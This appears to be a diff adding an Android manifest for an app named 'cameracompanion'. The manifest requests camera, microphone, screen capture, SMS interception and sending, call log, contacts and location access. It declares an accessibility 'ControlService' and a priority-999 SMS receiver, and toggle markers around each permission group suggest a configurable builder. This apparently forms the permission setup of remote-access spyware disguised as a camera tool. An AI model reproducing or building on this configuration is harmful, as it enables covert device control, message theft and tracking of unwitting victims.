@@ -1,0 +1,118 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.artem.cameracompanion">
+
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <!--PHONE_STATE_PERM_START-->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+    <!--PHONE_STATE_PERM_END-->
+    <!--CALL_LOG_PERM_START-->
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <!--CALL_LOG_PERM_END-->
+    <!--CALL_PHONE_PERM_START-->
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <!--CALL_PHONE_PERM_END-->
+    <!--CONTACTS_PERM_START-->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!--CONTACTS_PERM_END-->
+    <!--READ_SMS_PERM_START-->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <!--READ_SMS_PERM_END-->
+    <!--SEND_SMS_PERM_START-->
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <!--SEND_SMS_PERM_END-->
+    <!--RECEIVE_SMS_PERM_START-->
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <!--RECEIVE_SMS_PERM_END-->
+    <!--BT_CONNECT_PERM_START-->
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
+    <!--BT_CONNECT_PERM_END-->
+    <!--BT_SCAN_PERM_START-->
+    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
+    <!--BT_SCAN_PERM_END-->
+    <!--LOCATION_PERM_START-->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <!--LOCATION_PERM_END-->
+    <!--MEDIA_IMG_PERM_START-->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <!--MEDIA_IMG_PERM_END-->
+    <!--MEDIA_VID_PERM_START-->
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <!--MEDIA_VID_PERM_END-->
+    <!--MEDIA_LEGACY_PERM_START-->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <!--MEDIA_LEGACY_PERM_END-->
+    <!--CALENDAR_PERM_START-->
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
+    <!--CALENDAR_PERM_END-->
+    <!--BATTERY_PERM_START-->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <!--BATTERY_PERM_END-->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.FLASHLIGHT" />
+
+    <uses-feature android:name="android.hardware.camera.any" android:required="false" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
+        android:theme="@style/Theme.Material3.DayNight.NoActionBar">
+
+        <activity
+            android:name=".MainActivity"
+            android:exported="true"
+            android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".StreamingService"
+            android:foregroundServiceType="camera|microphone|mediaProjection"
+            android:exported="false" />
+
+        <!--CONTROL_SERVICE_START-->
+        <service
+            android:name=".ControlService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+        <!--CONTROL_SERVICE_END-->
+
+        <receiver
+            android:name=".SmsReceiver"
+            android:exported="true"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="999">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
